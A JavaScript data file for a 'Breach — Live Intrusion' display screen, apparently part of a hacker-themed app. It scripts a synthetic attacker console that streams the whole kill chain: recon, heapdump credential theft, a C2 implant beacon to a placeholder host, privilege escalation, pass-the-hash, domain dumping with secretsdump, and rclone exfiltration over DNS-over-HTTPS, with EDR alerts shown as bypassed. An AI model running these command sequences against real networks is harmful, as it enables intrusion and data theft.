/* ════════════════════════════════════════════════════════════════════════
   GHOSTCODER — 침투 (Breach / Live Intrusion) · 데이터
   ────────────────────────────────────────────────────────────────────────
   공격자 쪽 화면. 침입이 실시간으로 번지는 "상황판"이다 — 극적인 레드 얼럿.

     왼쪽   공격자 콘솔(C2) — 정찰→익스플로잇→비컨→권한상승→측면이동→수집→유출
            이 자동으로 흘러간다. 사람이 타이핑하지 않는다(자동화 도구의 속도).
     오른쪽 킬체인 진행 · 장악한 호스트 목록 · 데이터 유출 진행률.
     아래쪽 SIEM/EDR 경보 피드 — 일부는 "우회됨"으로 흐른다.

   전부 합성이고 아무것도 실행하지 않는다. 자격증명·해시는 마스킹된 가짜이며,
   동작하는 익스플로잇 코드가 아니라 "침해가 진행 중인 장면"을 그린 연출이다.
   화이트해커 모드(방어)의 반대편 — 공격자가 무엇을 하는지 보여 주는 쪽이다.
   ════════════════════════════════════════════════════════════════════════ */
"use strict";

const BR = (() => {

/* 내부 호스트 — 측면 이동 대상(가상). 전부 RFC 1918 사설 대역. */
const HOSTS = [
  { id: 'edge', name: 'edge-gateway', ip: '10.10.0.5', role: 'DMZ' },
  { id: 'was', name: 'APP-WAS-02', ip: '10.12.3.21', role: 'app' },
  { id: 'file', name: 'FILE-SRV01', ip: '10.12.8.40', role: 'files' },
  { id: 'db', name: 'DB-ORA-01', ip: '10.12.9.11', role: 'database' },
  { id: 'dc', name: 'DC01', ip: '10.12.0.10', role: 'domain controller' },
];

/* 공격자 콘솔 프롬프트 */
const P = '{{r|root@c2}}{{d|:}}{{b|~}}{{gr|#}} ';

/* 유출 대상(가상 파일/덤프) */
const EXFIL = [
  { name: 'customers.csv', mb: 2100 },
  { name: 'ledger_2026Q3.sql.gz', mb: 1340 },
  { name: 'ntds.dit', mb: 540 },
  { name: 'kyc_scans.7z', mb: 3820 },
];

/* 킬체인 단계 */
const CHAIN = [
  { id: 'recon', ko: '정찰', en: 'Recon' },
  { id: 'exploit', ko: '초기 침투', en: 'Exploit' },
  { id: 'c2', ko: 'C2 비컨', en: 'C2 beacon' },
  { id: 'privesc', ko: '권한 상승', en: 'Priv-esc' },
  { id: 'lateral', ko: '측면 이동', en: 'Lateral' },
  { id: 'collect', ko: '수집', en: 'Collection' },
  { id: 'exfil', ko: '유출', en: 'Exfiltration' },
];

/* 공격 진행 — act 단위. stage 로 킬체인을 켜고, lines 를 콘솔에 흘리고,
   fx 로 오른쪽 지표/호스트/유출을 갱신한다.
     fx.own     : 장악한 호스트 id (status → owned)
     fx.scan    : 스캔 중 호스트 id
     fx.creds   : 탈취 자격증명 증가분
     fx.priv    : 현재 권한 라벨
     fx.exfil   : 유출 시작할 파일 index 들
     fx.alert   : SIEM/EDR 경보 {t, bypassed?} */
const ACTS = [

{ stage: 'recon', fx: { scan: 'edge', alert: { t: 'IDS: port scan from 203.0.113.47 (low)', bypassed: true } }, lines: [
  P + '{{w|nmap -sV -Pn --top-ports 100 edge-gateway}}',
  '{{d|Starting Nmap 7.95 ( https://nmap.org )}}',
  '443/tcp  open  ssl/http  nginx',
  '8080/tcp open  http      Apache-Coyote/1.1',
  '{{y|[+] /actuator exposed · /broker staff portal found}}',
  '{{y|[+] candidate: CVE-2026-31337 (unauth actuator heapdump)}}',
] },

{ stage: 'exploit', fx: { own: 'edge', creds: 3, alert: { t: 'WAF: anomalous /actuator access (not blocked)', bypassed: true } }, lines: [
  P + '{{w|python3 leak_actuator.py --target edge --dump-heap}}',
  '{{d|[*] GET /actuator/heapdump  (182 MB) ...}}',
  '{{g|[+] recovered 41 session tokens, 3 service credentials}}',
  '{{g|[+] svc_broker : ******** (valid)}}',
] },

{ stage: 'c2', fx: { own: 'was', priv: 'svc_broker', alert: { t: 'EDR: unsigned beacon on APP-WAS-02', bypassed: true } }, lines: [
  P + '{{w|./implant --connect c2.example[.]net:8443 --tls}}',
  '{{g|[+] beacon 7f3a9c live   host=APP-WAS-02  user=CORP\\svc_broker}}',
  '{{c|beacon>}} {{w|getuid}}',
  'Server username: {{y|CORP\\svc_broker}}',
] },

{ stage: 'privesc', fx: { priv: 'SYSTEM', creds: 18, alert: { t: 'EDR: credential access (LSASS read) blocked → retried', bypassed: true } }, lines: [
  '{{c|beacon>}} {{w|sysinfo}}',
  'OS: Windows Server 2022   Arch: x64   Domain: CORP',
  '{{c|beacon>}} {{w|getsystem  (SeImpersonate → PrintSpoofer)}}',
  '{{g|[+] now NT AUTHORITY\\SYSTEM}}',
  '{{c|beacon>}} {{w|lsadump  # masked}}',
  '{{r|[+] CORP\\admin   NTLM aad3b4..:31d6cf..  (redacted)}}',
] },

{ stage: 'lateral', fx: { own: 'file', priv: 'Domain Admin', creds: 42, alert: { t: 'SIEM: unusual SMB auth FILE-SRV01 ← WAS-02', bypassed: false } }, lines: [
  P + '{{w|crackmapexec smb 10.12.8.40 -u admin -H <ntlm>}}',
  '{{g|[+] 10.12.8.40  FILE-SRV01  (Pwn3d!)   pass-the-hash OK}}',
  P + '{{w|psexec DB-ORA-01  # staged}}',
  '{{d|[*] pivoting toward domain controller ...}}',
] },

{ stage: 'lateral', fx: { own: 'dc', creds: 12842, alert: { t: 'SIEM: DCSync-like replication from non-DC host', bypassed: false } }, lines: [
  P + '{{w|secretsdump CORP/admin@DC01 -just-dc}}',
  '{{r|[+] dumping NTDS.dit ...}}',
  '{{r|[+] 12,842 domain accounts  (hashes redacted)}}',
  '{{g|[+] DC01 compromised — full domain control}}',
] },

{ stage: 'collect', fx: { own: 'db', alert: { t: 'DLP: large internal transfer to ~stage (flagged)', bypassed: true } }, lines: [
  P + '{{w|find \\\\FILE-SRV01\\share -name "*.xlsx" -o -name "loan_*.csv"}}',
  '{{g|[+] staged 3,114 files → C:\\Windows\\Temp\\~stage}}',
  P + '{{w|expdp ledger/**** dumpfile=ledger.dmp  # 2.1 GB}}',
  '{{g|[+] DB export complete: ledger.customers}}',
] },

{ stage: 'exfil', fx: { exfil: [0, 1, 2, 3], alert: { t: 'EDR: process hollowing detected → quarantine FAILED', bypassed: true } }, lines: [
  P + '{{w|rclone copy ~stage remote:exfil-cdn --dns-over-https}}',
  '{{d|[*] tunneling over DoH to evade egress filters ...}}',
  '{{g|[+] customers.csv            2.1 GB   done}}',
  '{{y|[+] kyc_scans.7z             3.8 GB   uploading ...}}',
  '{{r|[!] 18.4 GB exfiltrated. staging ransom note.}}',
] },
];

const UI = {
  ko: {
    title: '침투 — 실시간 침해',
    sub: '공격자 관점 연출 · 합성 시뮬레이션 (실행되지 않음)',
    active: '침해 진행 중',
    left: '공격자 콘솔 · C2',
    chain: '킬 체인',
    hosts: '장악 호스트',
    exfil: '데이터 유출',
    alerts: 'SIEM · EDR 경보',
    bypassed: '우회됨',
    detected: '탐지됨',
    owned: '장악', scanning: '스캔', idle: '대기',
    hostsK: '장악 호스트', credsK: '탈취 자격증명', dataK: '유출 데이터', privK: '권한', beaconK: 'C2 비컨', evadeK: '탐지 회피',
    evading: '회피 중', target: '대상',
    sim: '합성 · 실제 아님',
  },
  en: {
    title: 'Breach — Live Intrusion',
    sub: 'Attacker-side dramatization · synthetic simulation (nothing runs)',
    active: 'ACTIVE BREACH',
    left: 'Attacker console · C2',
    chain: 'Kill chain',
    hosts: 'Compromised hosts',
    exfil: 'Data exfiltration',
    alerts: 'SIEM · EDR alerts',
    bypassed: 'BYPASSED',
    detected: 'DETECTED',
    owned: 'OWNED', scanning: 'SCAN', idle: 'idle',
    hostsK: 'hosts owned', credsK: 'creds stolen', dataK: 'data exfil', privK: 'privilege', beaconK: 'C2 beacons', evadeK: 'evasion',
    evading: 'EVADING', target: 'target',
    sim: 'synthetic · not real',
  },
};

return { HOSTS, EXFIL, CHAIN, ACTS, P, UI };
})();

/* 레이아웃 자가 등록 — scenarios.js 를 수정하지 않고 작업 화면 칩에 추가한다. */
if (typeof SCEN !== 'undefined' && SCEN.LAYOUTS && !SCEN.LAYOUTS.breach) {
  SCEN.LAYOUTS.breach = {
    label: 'Breach — Live Intrusion', icon: '🛑',
    hint: 'The attacker’s side. A dramatized breach unfolding live: the C2 console streams recon → exploit → beacon → priv-esc → lateral movement → exfiltration on the left, while the kill chain, the hosts falling one by one, and the data-exfil bars fill on the right. Synthetic — nothing runs. The red-team counterpart to White-Hat Mode.',
    typing: false,
  };
}

if (typeof module !== 'undefined') module.exports = BR;
